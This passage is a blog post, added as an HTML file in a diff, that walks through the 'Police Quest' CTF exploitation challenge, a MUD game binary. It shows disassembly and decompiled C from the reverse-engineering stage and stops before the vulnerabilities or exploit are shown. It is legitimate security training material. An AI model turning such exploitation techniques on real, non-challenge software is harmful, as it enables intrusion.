@@ -1,0 +1,2221 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Police Quest CTF Exploit Challenge</title>
+  <meta name="description" content="Introduction">
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="canonical" href="/binholic/2018/12/27/police_quest.html">
+  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Binary World for Binary People :)</a>
+
+    <!--
+    <h2 class="site-subtitle">
+        <span class="site-subtitle-quote">"empty
+"</span>
+        <span class="site-subtitle-author">- no_author -</span>
+    </h2>
+    -->
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <a class="page-link" href="/blog/">Blog</a>
+      </div>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Police Quest CTF Exploit Challenge</h1>
+    <p class="post-meta"><time datetime="2018-12-27T18:50:00+01:00" itemprop="datePublished">Dec 27, 2018</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h1 id="introduction">Introduction</h1>
+
+<p>Today, I am going to talk about TheColonial’s “Police Quest” challenge.</p>
+
+<p>It is a challenge that implements a MUD, Multi-User-Dungeon.
+MUDs were quite a popular genre of games in the 80s. These games were fully textual due to lack of computing power and bandwith at the time. Each gamer would play as a character that would wade through rooms containing objects or characters. It’s the ancestor of the current MMORPG.</p>
+
+<p>This challenge is interesting as it takes the challenger through multiple vulnerabilities in order to properly flag it.
+It is protected with ASLR/NX/PIE/Partial RELRO.</p>
+
+<p>First we’ll start by reverse engineering the binary, then detailing the different vulnerabilities. We’ll end up exploiting it, porting it for the target docker and making it “universal” for both our targets. There will also be a small part about reliability.</p>
+
+<p>This blog post will be long, I suggest anyone interested to also open their favorite disassembler at the same time.
+There will be a lot of snippets of code, either disassembly or decompiled output (for readability).
+Unfortunately, due to the length of this article, there won’t be any gdb outputs and it won’t be necessary for understanding the exploitation process.</p>
+
+<h1 id="reverse-engineering-the-binary">Reverse engineering the binary</h1>
+
+<p>Here in the reverse engineering section I will switch between ASM view and decompiled C view as it allows to have different analysis angles. It will hopefully improve readability and understanding for the readers.
+All the shown code has been reversed and symbolicated manually, you’ll have to do it manually if you open the binary.</p>
+
+<h2 id="main">main</h2>
+
+<p>We first start with the main function.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.text:000000000000281B ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:000000000000281B                 public main
+.text:000000000000281B main            proc near               ; DATA XREF: _start+1D↑o
+.text:000000000000281B
+.text:000000000000281B var_18          = qword ptr -18h
+.text:000000000000281B var_10          = qword ptr -10h
+.text:000000000000281B var_4           = dword ptr -4
+.text:000000000000281B
+.text:000000000000281B ; __unwind {
+.text:000000000000281B            push    rbp
+.text:000000000000281C            mov     rbp, rsp
+.text:000000000000281F            sub     rsp, 20h
+.text:0000000000002823            mov     [rbp+var_4], edi
+.text:0000000000002826            mov     [rbp+var_10], rsi
+.text:000000000000282A            mov     [rbp+var_18], rdx
+.text:000000000000282E            mov     rax, cs:stdout_ptr
+.text:0000000000002835            mov     rax, [rax]
+.text:0000000000002838            mov     esi, 0          ; buf
+.text:000000000000283D            mov     rdi, rax        ; stream
+.text:0000000000002840            call    _setbuf                      ; 1
+.text:0000000000002845            mov     eax, 0
+.text:000000000000284A            call    setup                        ; 2
+.text:000000000000284F            mov     eax, 0
+.text:0000000000002854            call    welcome                      ; 3
+.text:0000000000002859
+.text:0000000000002859 loc_2859:                               ; CODE XREF: main+4A↓j
+.text:0000000000002859            mov     eax, 0
+.text:000000000000285E            call    run_turn                     ; 4
+.text:0000000000002863            test    eax, eax
+.text:0000000000002865            jnz     short loc_2859               ; 5
+.text:0000000000002867            lea     rdi, aSonnyIReallyDo ; "\nSonny, I really do appreciate you nai"...
+.text:000000000000286E            call    _puts                        ; 6
+.text:0000000000002873            mov     edi, 0FFFFFFFFh ; status
+.text:0000000000002878            call    _exit
+.text:0000000000002878 ; } // starts at 281B
+.text:0000000000002878 main            endp</code></pre></figure>
+
+<p>The function does the following:</p>
+
+<ol>
+  <li>Deactivate buffering</li>
+  <li>Link rooms between them</li>
+  <li>Print a welcome message</li>
+  <li>Run a playing turn</li>
+  <li>Continue running turns as long as the previous turn was “successful”</li>
+  <li>Print message and exit</li>
+</ol>
+
+<p>So our first constraint is to make run_turn() always return something different than 0 or exploitation fails terribly as the challenge exit.</p>
+
+<h2 id="setup">setup</h2>
+
+<p>The setup function links up room between them.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="code"><pre><span class="k">struct</span> <span class="n">room_struct</span> <span class="o">**</span><span class="nf">setup</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">room_struct</span> <span class="o">**</span><span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
+
+  <span class="n">hall</span><span class="o">-&gt;</span><span class="n">north</span> <span class="o">=</span> <span class="n">study</span><span class="p">;</span>
+  <span class="n">study</span><span class="o">-&gt;</span><span class="n">south</span> <span class="o">=</span> <span class="n">hall</span><span class="p">;</span>
+  <span class="n">hall</span><span class="o">-&gt;</span><span class="n">south</span> <span class="o">=</span> <span class="n">library</span><span class="p">;</span>
+  <span class="n">library</span><span class="o">-&gt;</span><span class="n">north</span> <span class="o">=</span> <span class="n">hall</span><span class="p">;</span>
+  <span class="n">hall</span><span class="o">-&gt;</span><span class="n">west</span> <span class="o">=</span> <span class="n">kitchen</span><span class="p">;</span>
+  <span class="n">kitchen</span><span class="o">-&gt;</span><span class="n">east</span> <span class="o">=</span> <span class="n">hall</span><span class="p">;</span>
+  <span class="n">library</span><span class="o">-&gt;</span><span class="n">east</span> <span class="o">=</span> <span class="n">bathroom</span><span class="p">;</span>
+  <span class="n">bathroom</span><span class="o">-&gt;</span><span class="n">west</span> <span class="o">=</span> <span class="n">library</span><span class="p">;</span>
+  <span class="n">kitchen</span><span class="o">-&gt;</span><span class="n">south</span> <span class="o">=</span> <span class="n">bar</span><span class="p">;</span>
+  <span class="n">bar</span><span class="o">-&gt;</span><span class="n">north</span> <span class="o">=</span> <span class="n">kitchen</span><span class="p">;</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">current_room</span><span class="p">;</span>
+  <span class="n">current_room</span> <span class="o">=</span> <span class="n">hall</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>When looking what a room is, we end up finding an array of 6 rooms.
+Each room has an object.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.data:00000000002051C0 all_rooms       dq 0                    ; DATA XREF: .data:study↓o
+.data:00000000002051C8                 dq 0
+.data:00000000002051D0                 dq 0
+.data:00000000002051D8                 dq 0
+.data:00000000002051E0                 dq offset all_objects
+.data:00000000002051E8                 dq offset aStudy        ; "Study"
+.data:00000000002051F0 kitchen_room    dq 0                    ; DATA XREF: .data:kitchen↓o
+.data:00000000002051F8                 dq 0
+.data:0000000000205200                 dq 0
+.data:0000000000205208                 dq 0
+.data:0000000000205210                 dq offset bullet_object
+.data:0000000000205218                 dq offset aKitchen      ; "Kitchen"
+.data:0000000000205220 bathroom_room   dq 0                    ; DATA XREF: .data:bathroom↓o
+.data:0000000000205228                 dq 0
+.data:0000000000205230                 dq 0
+.data:0000000000205238                 dq 0
+.data:0000000000205240                 dq offset tissue_object
+.data:0000000000205248                 dq offset aBathroom     ; "Bathroom"
+.data:0000000000205250 hall_room       dq 0                    ; DATA XREF: .data:hall↓o
+.data:0000000000205258                 dq 0
+.data:0000000000205260                 dq 0
+.data:0000000000205268                 dq 0
+.data:0000000000205270                 dq 0
+.data:0000000000205278                 dq offset aHall         ; "Hall"
+.data:0000000000205280 library_room    dq 0                    ; DATA XREF: .data:library↓o
+.data:0000000000205288                 dq 0
+.data:0000000000205290                 dq 0
+.data:0000000000205298                 dq 0
+.data:00000000002052A0                 dq offset glass_object
+.data:00000000002052A8                 dq offset aLibrary      ; "Library"
+.data:00000000002052B0 bar_room        dq 0                    ; DATA XREF: .data:bar↓o
+.data:00000000002052B8                 dq 0
+.data:00000000002052C0                 dq 0
+.data:00000000002052C8                 dq 0
+.data:00000000002052D0                 dq offset target_object
+.data:00000000002052D8                 dq offset aBar          ; "Bar"</code></pre></figure>
+
+<p>Given the setup() function and the array of rooms in the data section, we get our reversed structure:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">00000000 room_struct     struc ; (sizeof=0x30, mappedto_4)
+00000000                                         ; XREF: use_bullet+C/o
+00000000 north           dq ?                    ; XREF: setup+18/w
+00000000                                         ; setup+5F/w ... ; offset
+00000008 east            dq ?                    ; XREF: setup+8E/w
+00000008                                         ; setup+A6/w ... ; offset
+00000010 south           dq ?                    ; XREF: setup+2F/w
+00000010                                         ; setup+47/w ... ; offset
+00000018 west            dq ?                    ; XREF: setup+76/w
+00000018                                         ; setup+BE/w ... ; offset
+00000020 object          dq ?                    ; XREF: action_get+2B/r
+00000020                                         ; action_get+54/r ... ; offset
+00000028 name            dq ?                    ; XREF: use_revolver+78/r
+00000028                                         ; run_turn+24/r ... ; offset
+00000030 room_struct     ends</code></pre></figure>
+
+<p>We will skip the welcome() function as it only print a banner to the console.</p>
+
+<h2 id="run_turn">run_turn</h2>
+
+<p>The beginning of the function tells you where you are and what are the adjacent rooms.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.text:0000000000002561 ; Attributes: bp-based frame
+.text:0000000000002561
+.text:0000000000002561                 public run_turn
+.text:0000000000002561 run_turn        proc near               ; CODE XREF: main+43↓p
+.text:0000000000002561
+.text:0000000000002561 user_input      = byte ptr -1010h
+.text:0000000000002561 var_8           = qword ptr -8
+.text:0000000000002561
+.text:0000000000002561 ; __unwind {
+.text:0000000000002561                 push    rbp
+.text:0000000000002562                 mov     rbp, rsp
+.text:0000000000002565                 sub     rsp, 1010h
+.text:000000000000256C                 mov     rax, fs:28h
+.text:0000000000002575                 mov     [rbp+var_8], rax
+.text:0000000000002579                 xor     eax, eax
+.text:000000000000257B                 lea     rax, current_room
+.text:0000000000002582                 mov     rax, [rax+room_struct.north]
+.text:0000000000002585                 mov     rax, [rax+room_struct.name]
+.text:0000000000002589                 mov     rsi, rax
+.text:000000000000258C                 lea     rdi, aYouAreCurrentl ; "\nYou are currently standing in the %s."
+.text:0000000000002593                 mov     eax, 0
+.text:0000000000002598                 call    _printf
+.text:000000000000259D                 lea     rax, current_room
+.text:00000000000025A4                 mov     rax, [rax+room_struct.north]
+.text:00000000000025A7                 mov     rax, [rax+room_struct.north]
+.text:00000000000025AA                 test    rax, rax
+.text:00000000000025AD                 jz      short loc_25D4
+.text:00000000000025AF                 lea     rax, current_room
+.text:00000000000025B6                 mov     rax, [rax+room_struct.north]
+.text:00000000000025B9                 mov     rax, [rax+room_struct.north]
+.text:00000000000025BC                 mov     rax, [rax+room_struct.name]
+.text:00000000000025C0                 mov     rsi, rax
+.text:00000000000025C3                 lea     rdi, aToTheNorthLies ; " To the NORTH lies the %s."
+.text:00000000000025CA                 mov     eax, 0
+.text:00000000000025CF                 call    _printf
+.text:00000000000025D4
+.text:00000000000025D4 loc_25D4:                               ; CODE XREF: run_turn+4C↑j
+.text:00000000000025D4                 lea     rax, current_room
+.text:00000000000025DB                 mov     rax, [rax+room_struct.north]
+.text:00000000000025DE                 mov     rax, [rax+room_struct.east]
+.text:00000000000025E2                 test    rax, rax
+.text:00000000000025E5                 jz      short loc_260D
+.text:00000000000025E7                 lea     rax, current_room
+.text:00000000000025EE                 mov     rax, [rax+room_struct.north]
+.text:00000000000025F1                 mov     rax, [rax+room_struct.east]
+.text:00000000000025F5                 mov     rax, [rax+room_struct.name]
+.text:00000000000025F9                 mov     rsi, rax
+.text:00000000000025FC                 lea     rdi, aToTheEastLiesT ; " To the EAST lies the %s."
+.text:0000000000002603                 mov     eax, 0
+.text:0000000000002608                 call    _printf
+.text:000000000000260D
+.text:000000000000260D loc_260D:                               ; CODE XREF: run_turn+84↑j
+.text:000000000000260D                 lea     rax, current_room
+.text:0000000000002614                 mov     rax, [rax+room_struct.north]
+.text:0000000000002617                 mov     rax, [rax+room_struct.south]
+.text:000000000000261B                 test    rax, rax
+.text:000000000000261E                 jz      short loc_2646
+.text:0000000000002620                 lea     rax, current_room
+.text:0000000000002627                 mov     rax, [rax+room_struct.north]
+.text:000000000000262A                 mov     rax, [rax+room_struct.south]
+.text:000000000000262E                 mov     rax, [rax+room_struct.name]
+.text:0000000000002632                 mov     rsi, rax
+.text:0000000000002635                 lea     rdi, aToTheSouthLies ; " To the SOUTH lies the %s."
+.text:000000000000263C                 mov     eax, 0
+.text:0000000000002641                 call    _printf
+.text:0000000000002646
+.text:0000000000002646 loc_2646:                               ; CODE XREF: run_turn+BD↑j
+.text:0000000000002646                 lea     rax, current_room
+.text:000000000000264D                 mov     rax, [rax+room_struct.north]
+.text:0000000000002650                 mov     rax, [rax+room_struct.west]
+.text:0000000000002654                 test    rax, rax
+.text:0000000000002657                 jz      short loc_267F
+.text:0000000000002659                 lea     rax, current_room
+.text:0000000000002660                 mov     rax, [rax+room_struct.north]
+.text:0000000000002663                 mov     rax, [rax+room_struct.west]
+.text:0000000000002667                 mov     rax, [rax+room_struct.name]
+.text:000000000000266B                 mov     rsi, rax
+.text:000000000000266E                 lea     rdi, aToTheWestLiesT ; " To the WEST lies the %s."
+.text:0000000000002675                 mov     eax, 0
+.text:000000000000267A                 call    _printf</code></pre></figure>
+
+<p>This part of the code gets your input and then trigger the handlers matching these actions : LOOK, MOVE, USE, GET and INVENTORY.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.text:000000000000267F loc_267F:                               ; CODE XREF: run_turn+F6↑j
+.text:000000000000267F                 lea     rdi, aWhatDoYouWantT ; "\n\nWhat do you want to do?"
+.text:0000000000002686                 call    _puts
+.text:000000000000268B                 lea     rdi, aLookMoveUseGet ; "LOOK MOVE USE GET INVENTORY"
+.text:0000000000002692                 call    _puts
+.text:0000000000002697                 lea     rdi, asc_3C77   ; "\n&gt; "
+.text:000000000000269E                 mov     eax, 0
+.text:00000000000026A3                 call    _printf
+.text:00000000000026A8                 mov     rax, cs:stdin_ptr
+.text:00000000000026AF                 mov     rdx, [rax]      ; stream
+.text:00000000000026B2                 lea     rax, [rbp+user_input]
+.text:00000000000026B9                 mov     esi, 0FFFh      ; n
+.text:00000000000026BE                 mov     rdi, rax        ; s
+.text:00000000000026C1                 call    _fgets
+.text:00000000000026C6                 test    rax, rax
+.text:00000000000026C9                 jnz     short loc_26E1
+.text:00000000000026CB                 lea     rdi, aOkNoGoWithInpu ; "OK, no go with input!"
+.text:00000000000026D2                 call    _puts
+.text:00000000000026D7                 mov     eax, 0
+.text:00000000000026DC                 jmp     loc_2805
+.text:00000000000026E1 ; ---------------------------------------------------------------------------
+.text:00000000000026E1
+.text:00000000000026E1 loc_26E1:                               ; CODE XREF: run_turn+168↑j
+.text:00000000000026E1                 lea     rax, [rbp+user_input]
+.text:00000000000026E8                 mov     rdi, rax        ; s
+.text:00000000000026EB                 call    _strlen
+.text:00000000000026F0                 sub     rax, 1
+.text:00000000000026F4                 mov     [rbp+rax+user_input], 0
+.text:00000000000026FC                 mov     edi, 0Ah        ; c
+.text:0000000000002701                 call    _putchar</code></pre></figure>
+
+<p>We got 2 types of commands : those that takes an argument, and those that don’t.</p>
+
+<p>Command LOOK or INVENTORY have the same code, only some offsets change.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.text:000000000000272F loc_272F:                               ; CODE XREF: run_turn+1BD↑j
+.text:000000000000272F           lea     rax, [rbp+user_input]
+.text:0000000000002736           mov     rsi, rax        ; s2
+.text:0000000000002739           lea     rdi, aInventory ; "INVENTORY"    ; 1
+.text:0000000000002740           call    _strcmp
+.text:0000000000002745           test    eax, eax
+.text:0000000000002747           jnz     short loc_2758
+.text:0000000000002749           mov     eax, 0
+.text:000000000000274E           call    action_inventory
+.text:0000000000002753           jmp     loc_2805</code></pre></figure>
+
+<p>This is equivalent to:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span> <span class="p">(</span><span class="s">"INVENTORY"</span><span class="p">,</span> <span class="n">user_input</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">action_inventory</span> <span class="p">()</span>
+<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<ol>
+  <li>This is the main difference between LOOK and INVENTORY.</li>
+</ol>
+
+<p>MOVE, GET and USE have the same code as well but offsets.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.text:0000000000002758 loc_2758:                               ; CODE XREF: run_turn+1E6↑j
+.text:0000000000002758          lea     rax, [rbp+user_input]
+.text:000000000000275F          mov     edx, 5          ; n          ; 1
+.text:0000000000002764          mov     rsi, rax        ; s2
+.text:0000000000002767          lea     rdi, aMove      ; "MOVE "    ; 2
+.text:000000000000276E          call    _strncmp
+.text:0000000000002773          test    eax, eax
+.text:0000000000002775          jnz     short loc_278C
+.text:0000000000002777          lea     rax, [rbp+user_input]
+.text:000000000000277E          add     rax, 5                       ; 3
+.text:0000000000002782          mov     rdi, rax
+.text:0000000000002785          call    action_move
+.text:000000000000278A          jmp     short loc_2805</code></pre></figure>
+
+<p>You can see the differences between USE, GET and MOVE at 1 (length), 2 (string pointer) and 3 (length again).</p>
+
+<p>This is equivalent to:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span> <span class="p">(</span><span class="s">"MOVE "</span><span class="p">,</span> <span class="n">user_input</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">action_move</span> <span class="p">(</span><span class="n">user_input</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
+<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>Then it’s the end of the function.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.text:00000000000027F4 loc_27F4:                               ; CODE XREF: run_turn+27C↑j
+.text:00000000000027F4                 lea     rdi, aDonTYouKnowHow ; "Don't you know how to read instructions"...
+.text:00000000000027FB                 call    _puts
+.text:0000000000002800                 mov     eax, 0
+.text:0000000000002805
+.text:0000000000002805 loc_2805:                               ; CODE XREF: run_turn+17B↑j
+.text:0000000000002805                                         ; run_turn+1C9↑j ...
+.text:0000000000002805                 mov     rcx, [rbp+var_8]
+.text:0000000000002809                 xor     rcx, fs:28h
+.text:0000000000002812                 jz      short locret_2819
+.text:0000000000002814                 call    ___stack_chk_fail
+.text:0000000000002819 ; ---------------------------------------------------------------------------
+.text:0000000000002819
+.text:0000000000002819 locret_2819:                            ; CODE XREF: run_turn+2B1↑j
+.text:0000000000002819                 leave
+.text:000000000000281A                 retn
+.text:000000000000281A ; } // starts at 2561
+.text:000000000000281A run_turn        endp</code></pre></figure>
+
+<p>Any unrecognized inputs will cause the function to exit and make the challenge exit.</p>
+
+<p>Let’s have a look at each action handler.</p>
+
+<h2 id="action_look">action_look</h2>
+
+<p>This function prints in which room you are and how many objects of the corresponding type is available.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="code"><pre>        <span class="kt">signed</span> <span class="n">__int64</span> <span class="nf">action_look</span><span class="p">()</span>
+        <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"You stare vacantly around the %s, pretending to know what you're doing. "</span><span class="p">,</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+<span class="cm">/* 1 */</span>   <span class="k">if</span> <span class="p">(</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">count</span> <span class="p">)</span>
+<span class="cm">/* 2 */</span>       <span class="n">printf</span><span class="p">(</span><span class="s">"You spy %d %s(s/es).</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">,</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">);</span>
+            <span class="k">else</span>
+<span class="cm">/* 3 */</span>       <span class="n">printf</span><span class="p">(</span><span class="s">"There used to be a %s, but not any more.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">);</span>
+          <span class="p">}</span>
+          <span class="k">else</span>
+          <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"There's nothing in view. Go somewhere else if you're bored."</span><span class="p">);</span>
+          <span class="p">}</span>
+          <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
+        <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<ol>
+  <li>It check that the room actually has an object associated with it</li>
+  <li>There is still N objects of that type</li>
+  <li>No more objects, we got all of it</li>
+</ol>
+
+<h2 id="action_inventory">action_inventory</h2>
+
+<p>This function just goes through all the inventory and print the description of the items.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="code"><pre><span class="kt">signed</span> <span class="n">__int64</span> <span class="nf">action_inventory</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">inventory_struct</span> <span class="o">*</span><span class="n">iter_inventory</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">stuff</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">iter_inventory</span> <span class="o">=</span> <span class="n">stuff</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"You appear to be carrying:"</span><span class="p">);</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="n">iter_inventory</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">   - A %s"</span><span class="p">,</span> <span class="n">iter_inventory</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">);</span>
+      <span class="n">iter_inventory</span> <span class="o">=</span> <span class="n">iter_inventory</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">putchar</span><span class="p">(</span><span class="sc">'\n'</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"You aren't carrying anything. Perhaps you should give up now."</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
+<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>This gives us a hint that there is a structure for keeping tracks of the inventory.</p>
+
+<h2 id="action_move">action_move</h2>
+
+<p>It checks that it can move to either chosen direction and then set the current_room global variable to the new room, otherwise the program exit.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+</pre></td><td class="code"><pre><span class="kt">signed</span> <span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">action_move</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">direction</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">signed</span> <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">can_move</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="n">can_move</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">"NORTH"</span><span class="p">,</span> <span class="n">direction</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">north</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">current_room</span> <span class="o">=</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">north</span><span class="p">;</span>
+    <span class="n">can_move</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">"SOUTH"</span><span class="p">,</span> <span class="n">direction</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">south</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">current_room</span> <span class="o">=</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">south</span><span class="p">;</span>
+    <span class="n">can_move</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">"EAST"</span><span class="p">,</span> <span class="n">direction</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">east</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">current_room</span> <span class="o">=</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">east</span><span class="p">;</span>
+    <span class="n">can_move</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">"WEST"</span><span class="p">,</span> <span class="n">direction</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">west</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">current_room</span> <span class="o">=</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">west</span><span class="p">;</span>
+    <span class="n">can_move</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
